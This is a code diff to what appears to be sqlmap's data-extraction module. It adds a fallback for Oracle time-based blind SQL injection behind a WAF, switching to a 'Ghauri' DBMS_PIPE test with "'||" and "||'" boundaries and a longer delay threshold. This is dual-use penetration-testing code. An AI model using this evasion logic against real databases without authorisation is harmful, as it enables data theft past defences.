@@ -22,6 +22,7 @@ from lib.core.common import filterNone
 from lib.core.common import getPublicTypeMembers
 from lib.core.common import getTechnique
 from lib.core.common import getTechniqueData
+from lib.core.common import getSortedInjectionTests
 from lib.core.common import hashDBRetrieve
 from lib.core.common import hashDBWrite
 from lib.core.common import initTechnique
@@ -45,6 +46,7 @@ from lib.core.decorators import lockedmethod
 from lib.core.decorators import stackedmethod
 from lib.core.dicts import FROM_DUMMY_TABLE
 from lib.core.enums import CHARSET_TYPE
+from lib.core.enums import HASHDB_KEYS
 from lib.core.enums import DBMS
 from lib.core.enums import EXPECTED
 from lib.core.enums import PAYLOAD
@@ -516,6 +518,52 @@ def getValue(expression, blind=True, union=True, error=True, time=True, fromUser
                             value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)
                     if value is None:
                         kb.injection.oracleTimeUsedFallback = True
+
+                # Ghauri extraction fallback: simple threshold + Ghauri boundary when WAF causes statistical model to reject valid delays
+                waf_detected = (getattr(kb, 'identifiedWafs', None) and kb.identifiedWafs) or hashDBRetrieve(HASHDB_KEYS.CHECK_WAF_RESULT, True)
+                ghauri_test = None
+                if value is None and waf_detected and Backend.getIdentifiedDbms() == DBMS.ORACLE:
+                    for test in getSortedInjectionTests():
+                        if not (hasattr(test, "stype") and test.stype == PAYLOAD.TECHNIQUE.TIME):
+                            continue
+                        t = (getattr(test, "title", None) or "").lower()
+                        if "ghauri" in t and "dbms_pipe" in t:
+                            ghauri_test = test
+                            break
+                if value is None and ghauri_test is not None:
+                    prev_data = kb.injection.data.get(PAYLOAD.TECHNIQUE.TIME)
+                    prev_prefix = getattr(kb.injection, "prefix", None)
+                    prev_suffix = getattr(kb.injection, "suffix", None)
+                    prev_clause = getattr(kb.injection, "clause", None)
+                    prev_time_sec = conf.timeSec
+                    try:
+                        kb.ghauriExtractionMode = True
+                        if waf_detected and conf.timeSec < 9:
+                            conf.timeSec = 9
+                        for attr in ("templatePayload", "matchRatio", "comment", "payload", "trueCode", "falseCode"):
+                            setattr(ghauri_test, attr, getattr(prev_data, attr, None) if prev_data else None)
+                        kb.injection.data[PAYLOAD.TECHNIQUE.TIME] = ghauri_test
+                        kb.injection.prefix = "'||"
+                        kb.injection.suffix = "||'"
+                        if hasattr(ghauri_test, "clause") and ghauri_test.clause:
+                            kb.injection.clause = ghauri_test.clause
+                        initTechnique(PAYLOAD.TECHNIQUE.TIME)
+                        if conf.debug or conf.verbose >= 4:
+                            logger.debug("Ghauri fallback: prefix=%r, suffix=%r, ghauriExtractionMode=%s, timeSec=%d" % (kb.injection.prefix, kb.injection.suffix, kb.ghauriExtractionMode, conf.timeSec))
+                        logger.info("Ghauri extraction fallback: retrying with simple delay threshold")
+                        if expected == EXPECTED.BOOL:
+                            value = _goBooleanProxy(booleanExpression)
+                        else:
+                            value = _goInferenceProxy(query, fromUser, batch, unpack, charsetType, firstChar, lastChar, dump)
+                    finally:
+                        kb.ghauriExtractionMode = False
+                        conf.timeSec = prev_time_sec
+                        if prev_data is not None:
+                            kb.injection.data[PAYLOAD.TECHNIQUE.TIME] = prev_data
+                        kb.injection.prefix = prev_prefix
+                        kb.injection.suffix = prev_suffix
+                        kb.injection.clause = prev_clause
+                        initTechnique(PAYLOAD.TECHNIQUE.TIME)
         else:
             errMsg = "none of the injection types identified can be "
             errMsg += "leveraged to retrieve queries output"
